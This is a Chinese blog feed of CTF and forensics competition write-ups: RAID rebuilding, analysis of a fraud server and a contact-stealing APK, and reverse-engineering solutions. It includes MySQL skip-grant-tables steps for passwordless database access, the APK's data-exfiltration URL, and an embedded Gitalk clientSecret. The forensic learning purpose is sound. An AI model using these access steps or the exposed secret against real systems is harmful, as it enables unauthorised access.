<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>here&#39;s ling&#39;s blog</title>
  
  <subtitle>月が绮丽ですね</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://ll1ng.github.io/"/>
  <updated>2020-12-12T09:03:44.307Z</updated>
  <id>http://ll1ng.github.io/</id>
  
  <author>
    <name>ling</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>弘联杯甘政法</title>
    <link href="http://ll1ng.github.io/2020/11/19/forensics/"/>
    <id>http://ll1ng.github.io/2020/11/19/forensics/</id>
    <published>2020-11-19T02:37:53.000Z</published>
    <updated>2020-12-12T09:03:44.307Z</updated>
    
    <content type="html"><![CDATA[<p>&ensp;&ensp;这是哪来的题其实我也不知道…但跟<a href="https://blog.muted.top/" target="_blank" rel="noopener">MUTED</a>学到蛮多东西的所以打算记一下！（谢谢大哥！）<a id="more"></a><br><br>&ensp;&ensp;感谢<a href="https://arttnba3.cn/" target="_blank" rel="noopener">a3</a>和<a href="https://endcat.cn/" target="_blank" rel="noopener">囧姐姐</a>愿意带我打比赛qaq。10月和11月跟着他们参加了长安杯和美亚杯。说来这好像是自己第一次真正意义上参加团队比赛。<br>&ensp;&ensp;本人取证比赛是速成，零基础到接触取证之前都不知道移动硬盘和内存条能干啥，（内存条yyds！）对计算机硬件知识也知之甚少，所以应该不少地方都会有错误，记录下来的只是当前我和周围同学的做题方法。如果你有更好的方法或是发现了我的错误，欢迎在评论区指出。</p><h1 id="镜像"><a href="#镜像" class="headerlink" title="镜像"></a>镜像</h1><p><a href="https://cowtransfer.com/s/d3597f21de134a" target="_blank" rel="noopener">这里下载</a>（看了下2021年10月前应该都能下）</p><h1 id="个人赛"><a href="#个人赛" class="headerlink" title="个人赛"></a>个人赛</h1><h2 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h2><p>检材1.E01、2.E01、3.E01、4.E01为某磁盘阵列的磁盘镜像，以此为依据回答1-5题。<br><br><strong>1.该阵列采用的阵列方式为（）。</strong></p><blockquote><p>A.Raid 0<br><br>B.Raid 5<br><br>C.HP双循环<br><br>D.Raid 6<br></p></blockquote><p><strong>2.该阵列配置排列为（）</strong></p><blockquote><p>A.左同步<br><br>A.左异步<br><br>A.右同步<br><br>A.右异步<br></p></blockquote><p><strong>3.该阵列条带大小为（）KB</strong></p><blockquote><p>A.64<br><br>A.128<br><br>A.256<br><br>A.512<br></p></blockquote><p><strong>4.以1234盘序组成阵列，阵列偏移量的扇区号为（）</strong></p><blockquote><p>A.18432<br><br>A.106494<br><br>A.19456<br><br>A.3622<br></p></blockquote><p><strong>5.从阵列中提取的镜像文件的SHA256值为</strong></p><p>&ensp;&ensp;据说这是一道Raid重组。将4个检材加入取证大师。4个检材就有$A_4^4$=24中组合可能。点击<code>自动计算磁盘序列</code>，出来结果一般第一个就是正确的。但这个貌似不是，按照第一个4321的顺序与其他不正确的顺序排序都没什么区别。<br><img src="https://i.loli.net/2020/11/29/JgSWAeEYCIzfrBM.png" alt="raid.png"></p><p>右键单击图示区域可进行raid重组。<br><img src="https://i.loli.net/2020/11/29/bajtzwAylqKOWo5.png" alt="click.png"><br>只有在1234这种排列方式下，右键windows镜像进行<code>虚拟磁盘解析</code>才能解析出正常的结构，如图：<br><img src="https://i.loli.net/2020/11/29/dFNAGheJ871EDUP.png" alt="r.png"><br><img src="https://i.loli.net/2020/11/29/RbDoT6CJs5n3IW8.png" alt="result.png"><br>所以1题：Raid 5,2题：左同步,3题：512（1024扇区*512b扇区大小/1024）,4题18432,5题右键进行哈希值计算。</p><h2 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h2><p>&ensp;&ensp;案情：学生陈某通过某聊天软件向张某购买游戏外挂软件，安装后发现被骗，在担心自己手机信息被该软件窃取后向公安机关报案。警方根据陈某提供的线索顺利抓捕了嫌疑人张某，现场固定了张某使用的个人笔记本电脑“win10镜像.E01”（开机密码为qwer@123）。<br>请以检材”win10镜像.E01”为依据，回答6-19题。</p><p><strong>6.检材”win10镜像.E01”源盘的SHA256值为</strong><br></p><blockquote><p>3DEFA69BDCE111…<br></p></blockquote><p><strong>7.检材”win10镜像.E01”操作系统版本号为</strong><br></p><blockquote><p>1903<br></p></blockquote><p>啊咧？忘掉了…<br><br><strong>8.嫌疑人使用的Windows账户名为</strong><br><br>自动取证-系统痕迹-系统信息-用户信息。只有<code>ssssss</code>启用。<br></p><blockquote><p>ssssss<br></p></blockquote><p><strong>9.受害人陈某使用的邮箱账户为</strong><br><br>系统痕迹-邮件解析-发件箱，收件人邮箱</p><blockquote><p><a href="mailto:18251961826@139.com">18251961826@139.com</a></p></blockquote><p><strong>10.嫌疑人发送apk所使用的邮箱地址为</strong><br><br>同上，发件人邮箱</p><blockquote><p><a href="mailto:1137588348@qq.com">1137588348@qq.com</a></p></blockquote><p><strong>11.找出嫌疑人发给陈某的外挂apk软件，计算其SHA256值为()</strong><br><br>导出计算</p><blockquote><p>98203b8cd07…</p></blockquote><p><strong>12.嫌疑人使用第三方工具连接发卡平台服务器时，发卡平台服务器的IP地址是（）</strong></p><blockquote><p>172.16.80.99</p></blockquote><p>好像不会…<br><br><strong>13.通过对嫌疑人检材进行分析，发现该检材中安装有反取证软件，该检材最后一次运行反取证软件的时间是（）</strong></p><blockquote><p>2020-06-11 14:01:05</p></blockquote><p>系统痕迹-反取证软件分析，得到名称<code>VeraCrypt.exe</code>，然后没找到匹配的emm。<br><strong>14.嫌疑人检材中的手机备份文件其SHA256值为</strong></p><blockquote><p>9ba21f5bc…</p></blockquote><p>先找到手机备份文件。自己再做的时候记不清路径了，就用高级过滤过滤了一下逻辑大小在500MB以上的，找到了一个叫<code>jiami</code>的文件。接着查看自动取证-用户痕迹-最近访问记录，第一个就是<code>miyao.xml</code>。顺着路径去找却没有找到，后来从取证结果-回收站删除记录里导出了密钥文件。用<code>VeraCrypt</code>加载<code>jiami</code>，提示有密码，选择<code>使用密钥文件</code>，添加导出的<code>xml</code>即可成功挂载。解压挂载盘里的<code>tar</code>包进入套路…<br><br><strong>15.该备份手机的系统版本是（）</strong><br></p><blockquote><p>12.4.8</p></blockquote><p>分析-基本信息-设备信息<br><br><strong>16.该备份手机的IMEI号为（）</strong><br></p><blockquote><p>352038064601143</p></blockquote><p>同上<br><br><strong>17.该备份手机的iCloud账号为（）</strong></p><blockquote><p><a href="mailto:1622629449@qq.com">1622629449@qq.com</a></p></blockquote><p>同上<br><br><strong>18.陈某是通过哪种聊天工具联系到嫌疑人的（）</strong></p><blockquote><p>蝙蝠</p></blockquote><p>就，一通翻吧…<br><br><strong>19.陈某在该聊天工具中的用户ID为</strong></p><blockquote><p>4273008</p></blockquote><p>账户信息<br><br><strong>20.疑似嫌疑人使用的发卡平台管理员账号的登录密码为（）</strong></p><blockquote><p>123456</p></blockquote><p>8会</p><h1 id="团体赛"><a href="#团体赛" class="headerlink" title="团体赛"></a>团体赛</h1><p>linux的我好像习惯仿真做emm。用火眼仿真完用<code>vmware</code>打开，这个时候输入命令打印的内容如果太多会显示不全，可以用本机自己的shell ssh上这个服务器，还是挺方便。<br><strong>1.检材“disk01.E01”源盘的SHA256值为（）</strong></p><blockquote><p>91b0227fa…</p></blockquote><p><strong>2.发卡平台服务器的内核版本为（ ）</strong></p><blockquote><p>3.10.0-1062.18.1.el7.x86_64<br></p></blockquote><p><code>cat /proc/version</code><br><br><strong>3.发卡平台服务器中root账号最后一次的登陆时间为（）</strong></p><blockquote><p>2020-9-11 17:03:48</p></blockquote><p><code>more /var/log/secure</code>有一行</p><blockquote><p>Sep 11 17:03:48 iZbp147nnfz5942tvie7f4Z sshd[2512]: pam_unix(sshd:session): session opened for user root by (uid=0)</p></blockquote><p><strong>4.发卡平台服务器设置过一个定时任务，该定时任务在服务器中的存放路径为（）</strong></p><blockquote><p>/var/spool/cron/root</p></blockquote><p>百度到定时任务的路径是<code>/var/spool/cron</code>，文件内容长这样：<br><br><code>30 1 * * *  /www/server/cron/c4ed65ef4ec0b5389d8215829fd496f9 &gt;&gt; /www/server/cron/c4ed65ef4ec0b5389d8215829fd496f9.log 2&gt;&amp;1</code><br><br><strong>5.发卡平台绑定的域名为（）（ 多选题 ）</strong></p><blockquote><p>ofaka.zf,ofaka.game</p></blockquote><p>其实找关键文件的思路我也不太懂。这个题既然说了域名那就和<code>host</code>有关。于是<br><br><code>cat /www/server/panel/vhost/nginx/ofaka.game.conf</code>的<code>server_name</code>就是答案。<br><br><strong>6.发卡平台服务器与数据库连接的配置文件为（）</strong></p><blockquote><p>application.ini</p></blockquote><br><p>免密进入数据库的步骤：<br><code>service mysqld stop</code><br><code>mysqld_safe --skip-grant-tables</code><br><code>mysql -u root -p</code><br>然后回车。<br><br><strong>7.数据库的版本为（）</strong></p><blockquote><p>5.6.48</p></blockquote><p><code>mysql -V</code><br><br>打印出的结果是<br><code>mysql  Ver 14.14 Distrib 5.6.48, for Linux (x86_64) using  EditLine wrapper</code><br>这个版本要看Distrib后面的部分。或者进入数据库后输入<code>select version();</code><br></p><p><strong>8.数据库root账号的密码为（）</strong></p><blockquote><p>d4fd620fed2205ec</p></blockquote><p>可以通过尝试（原题是选择题）<br>或者进入数据库后<code>select password(&#39;xxx&#39;);</code>与<code>use mysql;show tables;select user,password from user;</code>（依次执行）的结果比较。（好像差不多吼）<br><br><strong>9.请找出该发卡平台后台管理页面管理员的登录地址http://（）</strong></p><blockquote><p><a href="http://ofaka.game/Admin/login" target="_blank" rel="noopener">http://ofaka.game/Admin/login</a>, <a href="http://ofaka.zf/Admin/login" target="_blank" rel="noopener">http://ofaka.zf/Admin/login</a></p></blockquote><p>8会<br><br><strong>10.该发卡平台中曾注册过一个测试账号，该账号的邮箱为（）</strong></p><blockquote><p><a href="mailto:43036456@qq.com">43036456@qq.com</a></p></blockquote><p>进入数据库后<code>use ofaka_game;show tables;select * from t_user;</code><br><strong>11.该发卡平台中测试账号创建时间为（）</strong></p><blockquote><p>2018-05-09 17:18:08</p></blockquote><p>上题的<code>createtime</code>为<code>1525857488</code>，用<code>select FROM_UNIXTIME(1525857488,&#39;%Y-%m-%d %H:%i:%s&#39;);</code>转换<br><br><strong>12.发卡平台网站中用来实现管理员账号登陆验证的代码存在于（）文件中</strong></p><blockquote><p>M_Admin_user.php</p></blockquote><p>导出<code>/www/wwwroot/default.com</code>文件夹，用<code>vscode</code>打开，搜索<code>admin</code>或者<code>login</code>，找到答案文件中<code>checkLogin</code>方法比较符合。<br><br><strong>13.利用现有的管理员账号登陆验证机制，如果将密码重置为“HL2020”，其他信息保持不变的情况下，数据库中“password”字段应该修改为</strong></p><blockquote><p>414d8c248fb2b9221d7d7b7caa21d950</p></blockquote><p><code>select</code>了个啥来着得到密码和旁边一串，旁边一串就是<code>salt</code>，然后代入定义的<code>password()</code>得到密码。运行的时候可以命令行<code>php -a</code>进入交互，无脑直接代就好。（好家伙这波过期仿真的虚拟机都打不开…<br><br><strong>14.陈某购买外挂软件的订单号是（）</strong></p><blockquote><p>zlkb2020091114355418256</p></blockquote><p>去数据库中<code>select * from t_order;</code>比对<br><br><strong>15.陈某购买外挂软件时的下单时间是（）</strong></p><blockquote><p>2020-09-11 14:35:54</p></blockquote><p>火眼中蝙蝠聊天记录里看到下单时间在2020-09-11 14:31:11之后，<code>select unix_timestamp(&#39;2020-09-11 14:31:11&#39;);</code>得到时间戳<code>1599805871</code>，下单时间在此之后，所以最后一项订单符合。<br><br><strong>16.陈某购买外挂软件时使用的查询密码是（）</strong></p><blockquote><p>112233</p></blockquote><p>忘了，火眼也过期了<br><br><strong>17.该APK软件的包名为（）</strong></p><blockquote><p>io.dcloud.PandoraEntry</p></blockquote><p><code>aapt d badging HPJY_3.1.apk</code><br><br><strong>18.该APP具有以下哪些权限（）</strong></p><blockquote><p>直接拨打电话，更改网络连接状态，读取通讯录，读取手机状态，录音</p></blockquote><p>同上<br><br><strong>19.该APP的签名算法为（）</strong></p><blockquote><p>SHA1withRSA</p></blockquote><p>将apk解压至HPJY3.1，<code>keytool -printcert -file HPJY3.1\META-INF\CERT.RSA</code><br><br><strong>20.该APP有盗取手机通讯录的功能，请找出该APP盗取通讯录后的回传地址http://（）</strong></p><blockquote><p>zx.lily4444.fun/Api/index/getlt</p></blockquote><p>将<code>apk</code>导出后，用安卓模拟器打开，在通讯录中添加联系人，打开<code>wireshark</code>准备开始捕获流量包。在输入完手机号和邀请码点击下一步之前，点击开始捕获分组，然后点击app的下一步并停止捕获。在获得的包里搜索联系人姓名。（<code>syml</code>大佬演示过一遍，但是自己搞的时候又没抓不到包了emm）<br><br><br>取证学到的东西感觉挺零散的，但有时候找题解又比较困难所以写了这篇。希望自己做的事情有意义叭。</p><div id="gitalk-container"></div><script src="https://cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script><link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"><script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script><script>var gitalkConfig = {"clientID":"0324b72a8577ea998218","clientSecret":"5e75c103ffafadd523fe6228fad280b3ec5a4972","repo":"comments","owner":"ll1ng","admin":["ll1ng"],"distractionFreeMode":false};    gitalkConfig.id = md5(location.pathname);var gitalk = new Gitalk(gitalkConfig);    gitalk.render("gitalk-container");    </script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&amp;ensp;&amp;ensp;这是哪来的题其实我也不知道…但跟&lt;a href=&quot;https://blog.muted.top/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;MUTED&lt;/a&gt;学到蛮多东西的所以打算记一下！（谢谢大哥！）
    
    </summary>
    
    
    
      <category term="电子取证" scheme="http://ll1ng.github.io/tags/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/"/>
    
  </entry>
  
  <entry>
    <title>moectf2020-部分writeup</title>
    <link href="http://ll1ng.github.io/2020/10/20/moectf2020/"/>
    <id>http://ll1ng.github.io/2020/10/20/moectf2020/</id>
    <published>2020-10-19T16:55:34.000Z</published>
    <updated>2020-10-20T11:12:25.967Z</updated>
    
    <content type="html"><![CDATA[<p>&emsp;&emsp;每次更完博客，心情都能平静下来，所以今天再来试试（？）</p><a id="more"></a><p>&emsp;&emsp;y1s1这次比赛我挺羡慕新生的。指导详尽友好得一批，夸一波全体出题人！</p><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><p>是大哥的方向！&gt;_&lt;</p><h2 id="protection"><a href="#protection" class="headerlink" title="protection"></a>protection</h2><p>&emsp;&emsp;这个题首先用<code>upx</code>脱壳，使用方法是<code>upx -d file</code>，然后拖入<code>ida</code>，找到主函数，按下<code>f5</code>，看到逻辑如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">printf((unsigned __int64)&quot;please input your flag: &quot;);</span><br><span class="line">  _isoc99_scanf((unsigned __int64)&quot;%28s&quot;);</span><br><span class="line">  for ( i &#x3D; 0; i &lt;&#x3D; 27; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( ((unsigned __int8)x[i] ^ (unsigned __int8)v5[i]) !&#x3D; y[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;wrong!&quot;, v5);</span><br><span class="line">      return 0;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;right!&quot;, v5);</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;就是将输入与字符串<code>x</code>的每一位进行异或看结果是否等于<code>y</code>的每一位。双击<code>x</code>和<code>y</code>去看看它们分别是什么。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.data:00000000004CB0F0 x               db &#39;aouv#@!V08asdozpnma&amp;*#%!$^&amp;*&#39;,0</span><br><span class="line">...</span><br><span class="line">.data:00000000004CB110 y               db 0Ch, 0, 10h, 15h, 57h, 26h, 5Ah, 23h, 2 dup(40h), 3Eh</span><br><span class="line">.data:00000000004CB110                                         ; DATA XREF: main+6E↑o</span><br><span class="line">.data:00000000004CB110                 db 42h, 37h, 30h, 9, 19h, 3, 1Dh, 50h, 43h, 7, 57h, 15h</span><br><span class="line">.data:00000000004CB110                 db 7Eh, 51h, 6Dh, 43h, 57h, 4 dup(0)</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;这里提取<code>y</code>的时候可以在<code>ida</code>界面下方的<code>python</code>框中进行如下操作。<br><img src="https://i.loli.net/2020/10/20/OGgTwEvInVX7Wud.png" alt="idapython.png"><br>&emsp;&emsp;其中<code>get_bytes(address,length)</code>第一个参数是起始地址，第二个是要提取的数据长度。</p><blockquote><p>这个东东好像是叫<code>idapython</code>来着，高级用法还挺多的，不过我还不大会用……目前只记住了这个</p></blockquote><p>&emsp;&emsp;接下来进行异或就完了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;[12, 0, 16, 21, 87, 38, 90, 35, 64, 64, 62, 66, 55, 48, 9, 25, 3, 29, 80, 67, 7, 87, 21, 126, 81, 109, 67, 87]</span><br><span class="line">s&#x3D;&#39;aouv#@!V08asdozpnma&amp;*#%!$^&amp;*&#39;</span><br><span class="line">for i in range(28):</span><br><span class="line">    print(chr(a[i]^ord(s[i])),end&#x3D;&#39;&#39;)</span><br></pre></td></tr></table></figure><p>输出结果：<br><code>moectf{upx_1S_simp1e-t0_u3e}</code></p><h2 id="MidPython"><a href="#MidPython" class="headerlink" title="MidPython"></a>MidPython</h2><p>&emsp;&emsp;哈哈哈这题挺好玩。用<code>uncompyle6</code>去逆的时候在加密函数的部分失败了，你说巧不巧……于是跑去问<a href="https://www.wootec.top/" target="_blank" rel="noopener">出题人</a>（我大哥！），出题人说是编译环境版本太新的缘故，于是这道题分数就上调了……<br><img src="https://i.loli.net/2020/10/20/yMtEgZKWbCH8RUh.png" alt="midpython.png"><br>&emsp;&emsp;卡了几天，后来看到hint里这句<code>本题考点更高级一点，与easy Python做法完全不同，建议多多了解Python语言，不仅仅只是语法，也包括Python的运行原理等。</code>哦，<strong>完全不同</strong>是吧。我好像明白了什么。于是去百度<code>python运行原理</code>，联系曾经把相对路径里某个文件命名成<code>string.py</code>，又在文件里<code>import string</code>导致调用封装好的函数时却报了<code>undefined</code>的经历，我想我知道做法了。。根据试验结果看（什么鬼），在<code>python</code>文件中<code>import</code>另一个<code>python</code>文件时会优先从当前目录找，找不到才会去安装路径里找，并且会生成<code>.pyc</code>文件。然后试了下<code>import</code>时只要当前路径下有同名<code>.pyc</code>文件同样可以正常运行。这应该就是利用解密函数的思路了。</p><p>&emsp;&emsp;虽然没办法全逆出来，但是逆出来正常的部分已经足够做题了。下面是逆出来的结果（删去了失败的部分）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"># uncompyle6 version 3.7.1</span><br><span class="line"># Python bytecode 3.8 (3413)</span><br><span class="line"># Decompiled from: Python 3.8.1 (tags&#x2F;v3.8.1:1b293b6, Dec 18 2019, 22:39:24) [MSC v.1916 32 bit (Intel)]</span><br><span class="line"># Embedded file name: .&#x2F;EzPython&#x2F;source.py</span><br><span class="line"># Compiled at: 2020-07-25 16:57:06</span><br><span class="line"># Size of source mod 2**32: 5784 bytes</span><br><span class="line">T_letter &#x3D; [&#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;]</span><br><span class="line"></span><br><span class="line">def Create_Matrix(key):</span><br><span class="line">    key &#x3D; Remove_Duplicates(key)</span><br><span class="line">    key &#x3D; key.replace(&#39; &#39;, &#39;&#39;)</span><br><span class="line">    j &#x3D; 0</span><br><span class="line">    for i in range(len(key)):</span><br><span class="line">        T_letter[j] +&#x3D; key[i]</span><br><span class="line">        if 0 &#x3D;&#x3D; (i + 1) % 5:</span><br><span class="line">            j +&#x3D; 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def Remove_Duplicates(key):</span><br><span class="line">    key &#x3D; key.upper()</span><br><span class="line">    _key &#x3D; &#39;&#39;</span><br><span class="line">    for ch in key:</span><br><span class="line">        if ch &#x3D;&#x3D; &#39;I&#39;:</span><br><span class="line">            ch &#x3D; &#39;J&#39;</span><br><span class="line">        if ch in _key:</span><br><span class="line">            continue</span><br><span class="line">        else:</span><br><span class="line">            _key +&#x3D; ch</span><br><span class="line"></span><br><span class="line">    return _key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def Get_MatrixIndex(ch):</span><br><span class="line">    for i in range(len(T_letter)):</span><br><span class="line">        for j in range(len(T_letter)):</span><br><span class="line">            if ch &#x3D;&#x3D; T_letter[i][j]:</span><br><span class="line">                return (i, j)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    key &#x3D; &#39;YWCNOPJAFGHDTULMQXZEBRVKS&#39;</span><br><span class="line">    flag_enc &#x3D; &#39;WYTFSQOYGYOQKJLHUE&#39;</span><br><span class="line">    Create_Matrix(key)</span><br><span class="line">    print(&#39;Please Input flag: &#39;)</span><br><span class="line">    plaintext &#x3D; input()</span><br><span class="line">    if plaintext[0:7] !&#x3D; &#39;moectf&#123;&#39; or plaintext[(-1)] !&#x3D; &#39;&#125;&#39;:</span><br><span class="line">        print(&#39;Ruaaaaa~Wrong!&#39;)</span><br><span class="line">        input()</span><br><span class="line">        exit()</span><br><span class="line">    else:</span><br><span class="line">        plaintext &#x3D; plaintext[7:-1]</span><br><span class="line">        flag &#x3D; Encrypt(plaintext, T_letter)</span><br><span class="line">        if flag !&#x3D; flag_enc:</span><br><span class="line">            print(&#39;Ruaaaaa~Wrong!&#39;)</span><br><span class="line">            input()</span><br><span class="line">            exit()</span><br><span class="line">        else:</span><br><span class="line">            pass</span><br><span class="line">        print(&#39;Congratulations!&#39;)</span><br><span class="line">        input()</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure><p>对去除前后缀以后的部分进行加密，若加密后与<code>flag_enc</code>相同则成功。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from puzzle import *</span><br><span class="line">key &#x3D; &#39;YWCNOPJAFGHDTULMQXZEBRVKS&#39;</span><br><span class="line">flag_enc &#x3D; &#39;WYTFSQOYGYOQKJLHUE&#39;</span><br><span class="line">Create_Matrix(key)</span><br><span class="line">print(T_letter)</span><br><span class="line"># 这个地方我其实有点惊讶，T_letter在另一个文件里定义了的话原来import后还可以直接在当前文件使用啊。。是我没见识</span><br><span class="line">print(Decrypt(flag_enc,T_letter))</span><br></pre></td></tr></table></figure><p>输出结果：<br><br><code>[&#39;YWCNO&#39;, &#39;PJAFG&#39;, &#39;HDTUL&#39;, &#39;MQXZE&#39;, &#39;BRVKS&#39;]</code></p><p><code>YOUARENOPOWERFULLZ</code></p><p>包上<code>moectf{}</code>提交即可。</p><h2 id="click-it"><a href="#click-it" class="headerlink" title="click it"></a>click it</h2><p>&emsp;&emsp;借这个题稍微熟悉一下安卓逆向。推荐下<code>happy</code>学长讲的<a href="https://www.bilibili.com/video/BV1uv41167pK" target="_blank" rel="noopener">安卓基础知识</a>。用安卓模拟器打开。本辣鸡的<code>jeb</code>又特么出问题了，写不了了，上课去了</p><h2 id="flower"><a href="#flower" class="headerlink" title="flower"></a>flower</h2><p>我好想会啊。。</p><div id="gitalk-container"></div><script src="https://cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script><link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"><script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script><script>var gitalkConfig = {"clientID":"0324b72a8577ea998218","clientSecret":"5e75c103ffafadd523fe6228fad280b3ec5a4972","repo":"comments","owner":"ll1ng","admin":["ll1ng"],"distractionFreeMode":false};    gitalkConfig.id = md5(location.pathname);var gitalk = new Gitalk(gitalkConfig);    gitalk.render("gitalk-container");    </script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&amp;emsp;&amp;emsp;每次更完博客，心情都能平静下来，所以今天再来试试（？）&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://ll1ng.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>一道maze</title>
    <link href="http://ll1ng.github.io/2020/07/30/%E4%B8%80%E9%81%93maze/"/>
    <id>http://ll1ng.github.io/2020/07/30/%E4%B8%80%E9%81%93maze/</id>
    <published>2020-07-30T15:18:57.000Z</published>
    <updated>2020-07-30T16:59:11.925Z</updated>
    
    <content type="html"><![CDATA[<p>xctf里新手区的那道maze</p><a id="more"></a><p>​        其实并不是很懂为什么我查到的wp全部一笔带过如何判断上下左右所对应的字母。满屏“易知”“不难看出”还有各种转载我也是挺无语的。。<br></p><h2 id="大概是正常做法8"><a href="#大概是正常做法8" class="headerlink" title="大概是正常做法8"></a>大概是正常做法8</h2><p>​        使用<code>ubuntu</code>中的<code>file</code>命令得知这是一个<code>elf</code>文件 。ida出来后第一个关键在这句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if ( asc_601060[8 * (signed int)v10 + SHIDWORD(v10)] !&#x3D; &#39;#&#39; )</span><br><span class="line">    goto LABEL_20;</span><br><span class="line">  v8 &#x3D; &quot;Congratulations!&quot;;</span><br></pre></td></tr></table></figure><p><code>asc_601060</code>这个地方就是存储迷宫的地方，看到8*将视图调整为8列显示，如图：</p><p><img src="https://i.loli.net/2020/07/31/WfvrqcyeNK5aVBO.png" alt="迷宫.png"></p><p>我们在上一句看到了宏定义<code>SHIDOWORD</code>，查阅了<a href="https://www.jianshu.com/p/7cc97bdd716d" target="_blank" rel="noopener">这篇博客</a>查到这句<code>#define SHIDWORD(x)  (*((int32*)&amp;(x)+1))</code>。对小端序的理解自我认为还阔以吧，解释下就是把当前指针<code>&amp;x</code>强制转换为32位整型指针（4个字节），地址加1，也就到了当前指针+4个字节的位置，指向下一个32位整型数据。在先前的声明中已经看到<code>__int64 v10; // [rsp+0h] [rbp-28h]</code>，所以实际上就是用<code>v10</code>的低4个字节存行（<code>signed int</code>大概是直接取低4个字节？8字节会溢出反正emm），高四个字节存列。<br></p><p>然后再分析四个函数所对应的方向。</p><p><img src="https://i.loli.net/2020/07/31/RMsTgZynlvPJ4p3.png" alt="函数.png"></p><blockquote><p>参数是<code>_DWORD *a1</code>，做图不小心盖住了。<code>char *</code>同理，指向单字节的指针，+-时指向地址+-1个字节。对了，不知道传<code>v3</code>干嘛哦。</p></blockquote><ul><li>左：传入高4字节，指向的内容+1</li><li>右：传入高4字节，+1</li><li>上：传入低4字节，-1</li><li>下：传入低4字节，+1</li></ul><blockquote><p>返回值应该是用来是否出界的。在加完以后判断是否仍小于8，减完之后判断是否仍大于0。</p></blockquote><p>再结合主函数的四个字母可以得出答案。<br></p><h2 id="不用判断上下左右的方法"><a href="#不用判断上下左右的方法" class="headerlink" title="不用判断上下左右的方法"></a>不用判断上下左右的方法</h2><p>​        之前我一直觉得宏定义神马的不用看（想锤死当时的自己），是做一道8位整型溢出的时候才注意到声明得看，宏定义也得看。前两天没看懂的时候是这么做的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td 